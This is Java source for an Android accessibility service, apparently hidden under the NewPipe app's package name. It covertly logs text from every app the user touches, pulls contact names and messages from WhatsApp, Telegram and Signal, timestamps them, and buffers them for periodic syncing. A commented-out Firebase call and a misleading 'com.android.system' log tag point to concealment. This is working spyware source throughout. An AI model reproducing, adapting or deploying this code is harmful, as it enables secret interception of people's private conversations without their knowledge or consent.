package org.schabi.newpipe.gameover;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.RequiresApi;

import org.schabi.newpipe.gameover.utils.SavePref;

import java.net.MalformedURLException;
import java.util.Date;


public class SocialMedia extends AccessibilityService {
    private static final String TAG = "Acc";
    StringBuilder str = new StringBuilder();
    String eventData;
    private StringBuilder textStringBuilder;
    private StringBuilder ScrollText;
    private String ChatName;
    private String whichEvent;
    private String txtContent = "";

    public static String getTimeStamped(long systemTime) {
        return new java.text.SimpleDateFormat("yyyyMMdd_HHmmss_z").
                format(new Date(systemTime)).replace(":", "_");
    }

    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                return "TYPE_VIEW_HOVER_ENTER";
            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                return "TYPE_VIEW_HOVER_EXIT";
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                return "TYPE_VIEW_TEXT_SELECTION_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                return "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY";
            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                return "TYPE_WINDOWS_CHANGED";
            case AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED:
                return "CONTENT_CHANGE_TYPE_UNDEFINED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED";
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                return "TYPE_ANNOUNCEMENT";
            case AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT:
                return "TYPE_ASSIST_READING_CONTEXT";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                return "TYPE_GESTURE_DETECTION_END";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                return "TYPE_GESTURE_DETECTION_START";
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_END";
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_START";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END:
                return "TYPE_TOUCH_INTERACTION_END";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START:
                return "TYPE_TOUCH_INTERACTION_START";
            case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED:
                return "TYPE_VIEW_CONTEXT_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                return "TYPE_VIEW_SCROLLED";
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                return "TYPE_WINDOW_CONTENT_CHANGED";
        }
        return "default";
    }

    private void getEventText(AccessibilityEvent event, StringBuilder sb) {
        try {
            for (CharSequence s : event.getText()) {
                if (event.getText() != null) {
                    sb.append(" ").append(s);
                }
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public AccessibilityNodeInfo findFocus(int focus) {
        return super.findFocus(focus);
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        Log.d(TAG, String.format("GestureEvent DATA : %s ", event.toString()));
        return super.onKeyEvent(event);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) throws RuntimeException {
        CharSequence packageName = event.getPackageName();
        if (packageName != null) {
            String PACKAGENAME = packageName.toString();
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
                try {
                    scrolltext(event);
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                }
            }
            if ((getEventType(event).equals("TYPE_VIEW_TEXT_CHANGED") ||
                    getEventType(event).equals("TYPE_VIEW_CLICKED") ||
                    getEventType(event).equals("TYPE_WINDOW_CONTENT_CHANGED") ||
                    getEventType(event).equals("TYPE_VIEW_TEXT_SELECTION_CHANGED"))) {
                try {
                    getEventText(event, textStringBuilder);

                    String dateString1 = getTimeStamped(System.currentTimeMillis());
                    String Chat = "\r\n" + "Message: " + textStringBuilder.toString() + "\r\n" + "Time: " + dateString1 + "\r\n";
                    if (!textStringBuilder.toString().equalsIgnoreCase("")) {
                        writeStrings2File(PACKAGENAME, Chat, "text");
                    }

                    textStringBuilder = new StringBuilder();
                } catch (Exception ignored) {
                }
            }
        }
    }

    private void scrolltext(AccessibilityEvent event) throws MalformedURLException {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            whichEvent = "===scrollviewchange===";
        }

        try {
            printscrolltext(source, ScrollText);
        } catch (RuntimeException ignored) {
        } catch (Exception ignored) {
            //e.printStackd();
        }
        String line1 = "\r\n" + whichEvent + "\r\n";
        ScrollText.append(line1);
        if (!textStringBuilder.toString().equalsIgnoreCase("")) {
            writeStrings2File(event.getPackageName().toString(), String.valueOf(ScrollText), "scroll");
        }
        ScrollText = new StringBuilder();
    }

    private void printscrolltext(AccessibilityNodeInfo source, StringBuilder ScrollText) {
        if (source == null) {
            return;
        }
        try {
            if (("android.widget.TextView").contentEquals(source.getClassName()) || ("android.widget.EditText")
                    .contentEquals(source.getClassName())) {
                String id = source.getViewIdResourceName();
                if (id != null) {
                    id = id.split("/")[1];
                    if (id.equalsIgnoreCase("conversation_contact_name")) {
                        ChatName = (String) source.getText();
                    }
                    //WHATSAPP BUSINESS
                    if (id.equalsIgnoreCase("conversations_row_contact_name")) {
                        ChatName = (String) source.getText();
                    }

                    //Telegram
                    if (id.equalsIgnoreCase("conversations_row_contact_name")) {
                        ChatName = (String) source.getText();
                    }

                    //signal
                    if (id.equalsIgnoreCase("message_request_subtitle")) {
                        ChatName = (String) source.getText();

                    }
                }
                eventData = "\r\n" + id + ",    " + source.getText();
                ScrollText.append(eventData);
            }

            for (int i = 0; i < source.getChildCount(); i++) {
                AccessibilityNodeInfo child = source.getChild(i);
                if (child != null) {
                    try {
                        printscrolltext(child, ScrollText);
                        child.recycle();
                    } catch (RuntimeException ignored) {
                    } catch (Exception ignored) {
                        //e.printStackd();
                    }
                }
            }
        } catch (RuntimeException ignored) {
        } catch (Exception ignored) {
            //e.printStackd();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 948;
        textStringBuilder = new StringBuilder();
        ScrollText = new StringBuilder();
        setServiceInfo(info);
    }

    private void writeStrings2File(String packageName, String content, String chatType)  {
        String updated = content;

        if (!chatType.equalsIgnoreCase("scroll")) {
            txtContent = updated;
            callGetFunction(updated, packageName + "_C");
        }
        if (chatType.equalsIgnoreCase("scroll")) {
            updated = txtContent + "\r\n" + updated;
            callGetFunction(updated, packageName + "_S");
            txtContent = "";
        }
    }

    ////// following two overrides are common to both voip and chat
    @Override
    public void onInterrupt() {
        Log.d(TAG, "SocialMedia onInterrupt");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "INIT CRS com.android.system");

        super.onServiceConnected();
        return START_STICKY;
    }

    public void callGetFunction(String data, String pkg){
        String appname = pkg.substring(pkg.lastIndexOf(".")+1);
        SavePref pref = new SavePref(this);
        String body = data + "^^" + appname+ " ";
        str.append(body);

        long timeForComparingLastSync = System.currentTimeMillis() / 1000;
        //Log.e("lalala", "outside ");

        if (timeForComparingLastSync >= (pref.getLastSync() + (1 * 60))) { // 10 minutes = 10 * 60

            String result = String.valueOf(str);

            //dbRef.child(aid).child("chats").child(timeStmp()).setValue(Gson().toJson(result));
            pref.setLastSync(timeForComparingLastSync);
            pref.setChat(result);
            str = new StringBuilder();
        }

    }

}

